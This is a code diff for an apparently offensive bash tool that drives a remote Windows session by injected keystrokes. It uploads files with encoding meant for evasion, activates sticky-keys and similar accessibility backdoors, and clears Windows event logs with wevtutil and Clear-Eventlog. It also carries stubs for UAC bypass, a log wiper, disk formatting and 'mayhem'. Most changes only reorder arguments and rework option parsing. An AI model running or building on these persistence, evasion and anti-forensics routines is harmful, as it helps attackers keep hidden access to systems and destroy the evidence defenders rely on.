@@ -91,8 +91,8 @@ function CountLines() {
     echo "${counter}"
 }
 
-# There is a limitation with this implementation. However, this is ideal
-# for transferring files with an absolute path.
+# There is a limitation with this implementation. 
+# However, this is ideal for uploading files with a specific path.
 
 function DirectoryName() {
     local filepath="${1}"
@@ -140,7 +140,7 @@ function terminate_program() {
 
 trap terminate_program SIGINT
 
-function CmdFile() {
+function Automate() {
     local file="${1}"
     local lines=$(CountLines "${file}")
 
@@ -212,9 +212,14 @@ function Base64() {
     local random_2=$(RandomString)
     local random_3=$(RandomString)
 
-    # TODO: Implement encryption method through base64 with -b,--bypass flag
-    # iconv -t UTF-16LE file.txt | gzip -c | openssl enc -a -e -A
-    # gzip -c file.exe | openssl enc -a -e -A
+    # TODO: Implement encryption method through base64 with -e,--evasion flag
+    # $ rks -i file -o output -m pwshb64 -e compression
+    # $ iconv -t UTF-16LE file.txt | gzip | basenc -w 0 --base64
+    # $ gzip -c file.exe | basenc -w 0 --base64
+
+    # $ rks -i file -o output -m pwshb64 -e aes256
+    # $ iconv -t UTF-16LE file.txt | gzip | openssl enc -a -e -A
+    # $ gzip -c file.exe | openssl enc -a -e -A
 
     # Check if input is passed as file
     if [[ -f "${input}" && ("${platform}" == "windows" || "${platform}" == "linux") && "${mode}" == "powershell" ]]
@@ -308,7 +313,7 @@ function Bin2Hex() {
         then
             if [[ "${platform}" != "windows" ]]
             then
-                print_status "error" "This method is exclusively used for windows because it relies on 'CertUtil.exe'."
+                print_status "error" "This method is only exclusive for windows!"
                 print_status "information" "Use 'nixhex' as a method instead."
                 print_status "information" "Terminating program..."
                 exit 1
@@ -419,7 +424,7 @@ function PowershellOutFile() {
             if [[ "${platform}" != "windows" ]]
             then
                 print_status "error" "This method is exclusively used for windows because it relies on 'CertUtil.exe'."
-                print_status "information" "Use 'nixb64' as a method instead."
+                print_status "information" "Use 'nixb64' method instead."
                 print_status "information" "Terminating program..."
                 exit 1
             fi
@@ -512,8 +517,8 @@ function CopyCon() {
 
     if [[ "${platform}" != "windows" ]]
     then
-        print_status "error" "copycon only exists on Windows operating system user!"
-        print_status "information" "Use 'pwshb64' as a method instead."
+        print_status "error" "copycon only exists on Windows operating system!"
+        print_status "information" "Use 'pwshb64' method instead."
         print_status "information" "Terminating program..."
         exit 1
     fi
@@ -630,6 +635,7 @@ function Upload() {
     local remote_file="${2}"
     local platform="${3}"
     local method="${4}"
+    local evasion="${5}"
 
     case "${method}" in
         "" | pwshb64)
@@ -675,17 +681,17 @@ function Upload() {
 }
 
 function Elevate() {
-    local elevate_mode="${1}"
-    local platform="${2}"
-    local elevate_method="${3}"
-    # TODO: add -e, --elevated flag
-    # -e info -p <windows | linux> -m bypassuac
+    local elevate_method="${1}"
+    local elevate_action="${2}"
+    local platform="${3}"
+    # TODO: add -a, --action flag
+    # -a info -p <windows | linux> -m bypassuac
     echo "Not implemented"
 }
 
 function CreateUser() {
-    local mode="${1}"
-    local platform="${2}"
+    local platform="${1}"
+    local action="${2}"
     read -d '' description << EndOfText
 Fill in the description of the technique
 EndOfText
@@ -700,7 +706,7 @@ EndOfText
         echo "Linux"
     fi
 
-    if [[ "${mode}" == "info" ]]
+    if [[ "${action}" == "info" ]]
     then
         echo "${description}"
     else
@@ -709,8 +715,8 @@ EndOfText
 }
 
 function StickyKey() {
-    local mode="${1}"
-    local platform="${2}"
+    local platform="${1}"
+    local action="${2}"
     read -d '' description << EndOfText
 Fill in the description of the technique
 EndOfText
@@ -720,13 +726,14 @@ EndOfText
     if [[ "${platform}" != "windows" ]]
     then
         print_status "error" "Registry keys only exists on Windows operating system user!"
+        print_status "information" "Terminating program..."
         exit 1
     fi
 
-    if [[ "${mode}" == "info" ]]
+    if [[ "${action}" == "info" ]]
     then
         echo "${description}"
-    elif [[ "${mode}" == "backdoor" ]]
+    elif [[ "${action}" == "backdoor" ]]
     then
         print_status "progress" "Activating sethc.exe (sticky keys) backdoor..."
         Keyboard "shift shift shift shift shift" "customkey"
@@ -737,8 +744,8 @@ EndOfText
 }
 
 function UtilityManager() {
-    local mode="${1}"
-    local platform="${2}"
+    local platform="${1}"
+    local action="${2}"
     read -d '' description << EndOfText
 Fill in the description of the technique
 EndOfText
@@ -748,13 +755,14 @@ EndOfText
     if [[ "${platform}" != "windows" ]]
     then
         print_status "error" "Registry keys only exists on Windows operating system user!"
+        print_status "information" "Terminating program..."
         exit 1
     fi
 
-    if [[ "${mode}" == "info" ]]
+    if [[ "${action}" == "info" ]]
     then
         echo "${description}"
-    elif [[ "${mode}" == "backdoor" ]]
+    elif [[ "${action}" == "backdoor" ]]
     then
         print_status "progress" "Activating utilman.exe (utility manager) backdoor..."
         Keyboard "Super+u" "customkey"
@@ -765,8 +773,8 @@ EndOfText
 }
 
 function Magnifier() {
-    local mode="${1}"
-    local platform="${2}"
+    local platform="${1}"
+    local action="${2}"
     read -d '' description << EndOfText
 Fill in the description of the technique
 EndOfText
@@ -779,10 +787,10 @@ EndOfText
         exit 1
     fi
 
-    if [[ "${mode}" == "info" ]]
+    if [[ "${action}" == "info" ]]
     then
         echo "${description}"
-    elif [[ "${mode}" == "backdoor" ]]
+    elif [[ "${action}" == "backdoor" ]]
     then
         print_status "progress" "Activating magnifier.exe backdoor..."
         Keyboard "Super+equal" "customkey"
@@ -794,8 +802,8 @@ EndOfText
 }
 
 function Narrator() {
-    local mode="${1}"
-    local platform="${2}"
+    local platform="${1}"
+    local action="${2}"
     read -d '' description << EndOfText
 Fill in the description of the technique
 EndOfText
@@ -805,13 +813,14 @@ EndOfText
     if [[ "${platform}" != "windows" ]]
     then
         print_status "error" "Registry keys only exists on Windows operating system user!"
+        print_status "information" "Terminating program..."
         exit 1
     fi
 
-    if [[ "${mode}" == "info" ]]
+    if [[ "${action}" == "info" ]]
     then
         echo "${description}"
-    elif [[ "${mode}" == "backdoor" ]]
+    elif [[ "${action}" == "backdoor" ]]
     then
         print_status "progress" "Activating narrator.exe backdoor..."
         Keyboard "Super+Return" "customkey"
@@ -822,8 +831,8 @@ EndOfText
 }
 
 function DisplaySwitch() {
-    local mode="${1}"
-    local platform="${2}"
+    local platform="${1}"
+    local action="${2}"
     read -d '' description << EndOfText
 Fill in the description of the technique
 EndOfText
@@ -833,13 +842,14 @@ EndOfText
     if [[ "${platform}" != "windows" ]]
     then
         print_status "error" "Registry keys only exists on Windows operating system user!"
+        print_status "information" "Terminating program..."
         exit 1
     fi
 
-    if [[ "${mode}" == "info" ]]
+    if [[ "${action}" == "info" ]]
     then
         echo "${description}"
-    elif [[ "${mode}" == "backdoor" ]]
+    elif [[ "${action}" == "backdoor" ]]
     then
         print_status "progress" "Activating displayswitch.exe backdoor..."
         Keyboard "Super+p" "customkey"
@@ -850,32 +860,32 @@ EndOfText
 }
 
 function Persistence() {
-    local persistence_mode="${1}"
-    local platform="${2}"
-    local persistence_method="${3}"
+    local platform="${1}"
+    local persistence_method="${2}"
+    local persistence_action="${3}"
 
-    # -s, --select flag "info,backdoor". For "info" contains the execution commands
+    # -a, --action flag "info,backdoor". For "info" contains the execution commands
     # for both command prompt and powershell. To enumerate, persistence and cleanup
     # For "backdoor" to activate the backdoor
     # TODO: Fill in the rest of the persistence methods
     case "${persistence_method}" in
         createuser)
-            CreateUser "${persistence_mode}" "${platform}"
+            CreateUser "${platform}" "${persistence_action}"
             ;;
         sethc)
-            StickyKey "${persistence_mode}" "${platform}"
+            StickyKey "${platform}" "${persistence_action}"
             ;;
         utilman)
-            UtilityManager "${persistence_mode}" "${platform}"
+            UtilityManager "${platform}" "${persistence_action}"
             ;;
         magnifier)
-            Magnifier "${persistence_mode}" "${platform}"
+            Magnifier "${platform}" "${persistence_action}"
             ;;
         narrator)
-            Narrator "${persistence_mode}" "${platform}"
+            Narrator "${platform}" "${persistence_action}"
             ;;
         displayswitch)
-            DisplaySwitch "${persistence_mode}" "${platform}"
+            DisplaySwitch "${platform}" "${persistence_action}"
             ;;
         *)
             print_status "error" "Invalid Persistence Technique!" >&2
@@ -885,18 +895,25 @@ function Persistence() {
 }
 
 function WevUtil() {
-    local mode="${1}"
+    local action="${1}"
     read -d '' description << EndOfText
 Fill in the description of the technique
 EndOfText
 
-    if [[ "${mode}" == "info" ]]
+    if [[ "${platform}" != "windows" ]]
+    then
+        print_status "error" "This method is only exclusive for windows!"
+        print_status "information" "Terminating program..."
+        exit 1
+    fi
+
+    if [[ "${action}" == "info" ]]
     then
         echo "${description}"
-    elif [[ "${mode}" == "quick" ]]
+    elif [[ "${action}" == "quick" ]]
     then
         Execute "for /f \"tokens=*\" %1 in ('wevtutil.exe el') do wevtutil.exe cl \"%1\"" "none"
-    elif [[ "${mode}" == "full" ]]
+    elif [[ "${action}" == "full" ]]
     then
     # TODO: Include the wiper and then transfer it with Base64 certutil cmd terminal
         echo "not implemented"
@@ -907,18 +924,25 @@ EndOfText
 }
 
 function WinEvent() {
-    local mode="${1}"
+    local action="${1}"
     read -d '' description << EndOfText
 Fill in the description of the technique
 EndOfText
 
-    if [[ "${mode}" == "info" ]]
+    if [[ "${platform}" != "windows" ]]
+    then
+        print_status "error" "This method is only exclusive for windows!"
+        print_status "information" "Terminating program..."
+        exit 1
+    fi
+
+    if [[ "${action}" == "info" ]]
     then
         echo "${description}"
-    elif [[ "${mode}" == "quick" ]]
+    elif [[ "${action}" == "quick" ]]
     then
         Execute "Clear-Eventlog -Log Application,Security,System -Confirm" "none"
-    elif [[ "${mode}" == "full" ]]
+    elif [[ "${action}" == "full" ]]
     then
     # TODO: Include the wiper and then transfer it with Base64 powershell terminal
         echo "not implemented"
@@ -929,16 +953,23 @@ EndOfText
 }
 
 function EventViewer() {
-    local mode="${1}"
+    local action="${1}"
     read -d '' description << EndOfText
 Fill in the description of the technique
 EndOfText
 
-    if [[ "${mode}" == "info" ]]
+    if [[ "${platform}" != "windows" ]]
+    then
+        print_status "error" "This method is only exclusive for windows!"
+        print_status "information" "Terminating program..."
+        exit 1
+    fi
+
+    if [[ "${action}" == "info" ]]
     then
         # TODO: Include information of this technique
         echo ""
-    elif [[ ${mode} == "manual" ]]
+    elif [[ "${action}" == "manual" ]]
     then
         DialogBox "eventvwr.msc"
     else
@@ -948,11 +979,10 @@ EndOfText
 }
 
 function AntiForensics() {
-    local antiforensics_mode="${1}"
-    local platform="${2}"
-    local antiforensics_method="${3}"
+    local antiforensics_method="${1}"
+    local antiforensics_action="${2}"
+    local platform="${3}"
     # TODO: Include features for anti-forensics also include eventvwr.msc with a dialog box
-    # add flag -a, --antiforensics
 
     # -a <info (display info) | execute (to execute the commands | script (to transfer script) | manual (display the commands)>
     # -p <windows | linux> -m <wevutil | winevent>
@@ -962,19 +992,35 @@ function AntiForensics() {
     # Bash script
     case "${antiforensics_method}" in
         wevutil)
-            WevUtil "${antiforensics_mode}" "${platform}" "${antiforensics_method}"
+            WevUtil "${antiforensics_method}" "${platform}" "${antiforensics_action}"
             ;;
         winevent)
-            WinEvent "${antiforensics_mode}" "${platform}" "${antiforensics_method}"
+            WinEvent "${antiforensics_method}" "${platform}" "${antiforensics_action}"
             ;;
         eventvwr)
-            EventViewer "${antiforensics_mode}" "${platform}" "${antiforensics_method}"
+            EventViewer "${antiforensics_method}" "${platform}" "${antiforensics_action}"
             ;;
         *)
             print_status "error" "Invalid Antiforensic Technique!" >&2
             exit 1
             ;;
     esac
+}
+
+function FormatDisk() {
+    read -d '' description << EndOfText
+Fill in the description of the technique
+EndOfText
+
+    echo "not implemented"
+}
+
+function Mayhem() {
+    local mayhem_method="${1}"
+    local mayhem_action="${2}"
+    local platform="${3}"
+
+    echo "not implemented"
 }
 
 # TODO: Add more flags once it's fully implemented
@@ -1000,79 +1046,23 @@ COMMON OPTIONS:
     -h, --help                          Display this help message
 
 METHODS:
-    -m, --method <method>               Specify the file transfer or execution method
-                                        (For file transfer "pwshb64" is set by default if
-                                        not specified. For command execution method
-                                        "none" is set by default if not specified)
+    -m, --method <method>               Specify a method. For command execution method
+                                        "none" is set by default if not specified.
+                                        For file transfer "pwshb64" is set by default
+                                        if not specified. Other available methods are:
+                                        "elevate", "persistence", "antiforensics", and
+                                        "mayhem".
+
+    -s, --submethod <submethod>         (applies with -m)
+
+    -a, --action <action>               (applies with -s)
+
+    -e, --evasion <evasion>             (Only works with -m for uploading files)
 EndOfText
 
     echo "${usage}"
     exit 1
 }
-
-long_opts="command:,input:,output:,elevate:,select:,antiforensics:,platform:,method:,windowname:,help"
-
-OPTS=$(getopt -o "c:i:o:e:s:a:p:m:w:h" --long "$long_opts" -n "$(basename "${0}")" -- "${@}")
-if [[ ${?} != 0 ]]
-then
-    echo "Failed to parse options... Exiting." >&2
-    exit 1
-fi
-
-eval set -- "${OPTS}"
-
-while true
-do
-    case ${1} in
-        -c | --command)
-            COMMAND="${2}"
-            shift 2
-            ;;
-        -i | --input)
-            INPUT="${2}"
-            shift 2
-            ;;
-        -o | --output)
-            OUTPUT="${2}"
-            shift 2
-            ;;
-        -e | --elevate)
-            ELEVATE="${2,,}"
-            shift 2
-            ;;
-        -s | --select)
-            SELECT="${2,,}"
-            shift 2
-            ;;
-        -a | --antiforensics)
-            ANTIFORENSICS="${2,,}"
-            shift 2
-            ;;
-        -p | --platform)
-            PLATFORM="${2,,}"
-            shift 2
-            ;;
-        -m | --method)
-            METHOD="${2,,}"
-            shift 2
-            ;;
-        -w | --windowname)
-            WINDOWNAME="${2}"
-            shift 2
-            ;;
-        -h | --help)
-            usage
-            ;;
-        --)
-            shift
-            break
-            ;;
-        *)
-            echo "Invalid option: ${1}" >&2
-            exit 1
-            ;;
-    esac
-done
 
 function main() {
     check_dependencies
@@ -1095,58 +1085,109 @@ function main() {
         WINDOWNAME="TightVNC"
     fi
 
+    if [[ ! -f "${COMMAND}" && -n "${COMMAND}" ]]
+    then
+        # When input is string and not a file. It executes command
+        if [[ -z "${METHOD}" ]]
+        then
+            METHOD="none"
+        fi
+        Execute "${COMMAND}" "${METHOD}"
+    elif [[ -f "${COMMAND}" ]]
+    then
+        # Check if a file is passed as input then execute commands
+        Automate "${COMMAND}"
+    fi
+
     # Operating System
     if [[ -z "${PLATFORM}" ]]
     then
         PLATFORM="windows"
+        if [[ -f "${INPUT}" && -n "${OUTPUT}" && (-z "${METHOD}" || -n "${METHOD}") ]]
+        then
+            Upload "${INPUT}" "${OUTPUT}" "${METHOD}" "${PLATFORM}"
+        elif [[ "${METHOD}" == "elevate" && -n "${SUBMETHOD}" && -n "${ACTION}" ]]
+        then
+            Elevate "${SUBMETHOD}" "${ACTION}" "${PLATFORM}"
+        elif [[ "${METHOD}" == "persistence" && -n "${SUBMETHOD}" && -n "${ACTION}" ]]
+        then
+            Persistence "${SUBMETHOD}" "${ACTION}" "${PLATFORM}"
+        elif [[ "${METHOD}" == "antiforensics" && -n "${SUBMETHOD}" && -n "${ACTION}" ]]
+        then
+            AntiForensics "${SUBMETHOD}" "${ACTION}" "${PLATFORM}"
+        elif [[ "${METHOD}" == "mayhem" && -n "${SUBMETHOD}" && -n "${ACTION}" ]]
+        then
+            Mayhem "${SUBMETHOD}" "${ACTION}" "${PLATFORM}"
+        fi
     elif [[ "${PLATFORM}" != "windows" && "${PLATFORM}" != "linux" ]]
     then
         print_status "error" "Invalid or operating system not supported. Allowed values: 'windows' or 'linux'."
         exit 1
     fi
-
-    # Check if a file is passed as input then execute commands
-    if [[ -f "${COMMAND}" ]]
-    then
-        CmdFile "${COMMAND}"
-    fi
-
-    if [[ ! -f "${COMMAND}" && -n "${COMMAND}" ]]
-    then
-        # When input is string and not a file. It executes command
-        if [ -z "${METHOD}" ]
-        then
-            METHOD="none"
-        fi
-        Execute "${COMMAND}" "${METHOD}"
-    fi
-
-    # File transfer
-    if [[ -f "${INPUT}" && -n "${OUTPUT}" ]]
-    then
-        Upload "${INPUT}" "${OUTPUT}" "${PLATFORM}" "${METHOD}"
-    fi
-
-    # Privilege Escalation
-    if [[ -n "${ELEVATE}" && -n "${METHOD}" ]]
-    then
-        # -e info -p <windows | linux> -m bypassuac
-        Elevate "${ELEVATE}" "${PLATFORM}" "${METHOD}"
-    fi
-
-    # Persistence
-    if [[ -n "${SELECT}" && -n "${METHOD}" ]]
-    then
-        # -s <info | backdoor> -p <windows | linux> -m <persistence_method>
-        Persistence "${SELECT}" "${PLATFORM}" "${METHOD}"
-    fi
-
-    # Antiforensics
-    if [[ -n "${ANTIFORENSICS}" && -n "${METHOD}" ]]
-    then
-        # -a <info | execute> -p <windows | linux> -m <antiforensics_method>
-        AntiForensics "${ANTIFORENSICS}" "${PLATFORM}" "${METHOD}"
-    fi
 }
+
+LONG_OPTIONS="command:,input:,output:,method:,submethod:,action:,evasion:,platform:,windowname:,help"
+
+OPTIONS=$(getopt -o "c:i:o:m:s:a:e:p:w:h" --long "${LONG_OPTIONS}" -n "$(basename "${0}")" -- "${@}")
+if [[ ${?} != 0 ]]
+then
+    echo "Failed to parse options... Exiting." >&2
+    exit 1
+fi
+
+eval set -- "${OPTIONS}"
+
+while true
+do
+    case ${1} in
+        -c | --command)
+            COMMAND="${2}"
+            shift 2
+            ;;
+        -i | --input)
+            INPUT="${2}"
+            shift 2
+            ;;
+        -o | --output)
+            OUTPUT="${2}"
+            shift 2
+            ;;
+        -m | --method)
+            METHOD="${2,,}"
+            shift 2
+            ;;
+        -s | --submethod)
+            SUBMETHOD="${2,,}"
+            shift 2
+            ;;
+        -a | --action)
+            ACTION="${2,,}"
+            shift 2
+            ;;
+        -e | --evasion)
+            EVASION="${2,,}"
+            shift 2
+            ;;
+        -p | --platform)
+            PLATFORM="${2,,}"
+            shift 2
+            ;;
+        -w | --windowname)
+            WINDOWNAME="${2}"
+            shift 2
+            ;;
+        -h | --help)
+            usage
+            ;;
+        --)
+            shift
+            break
+            ;;
+        *)
+            echo "Invalid option: ${1}" >&2
+            exit 1
+            ;;
+    esac
+done
 
 main
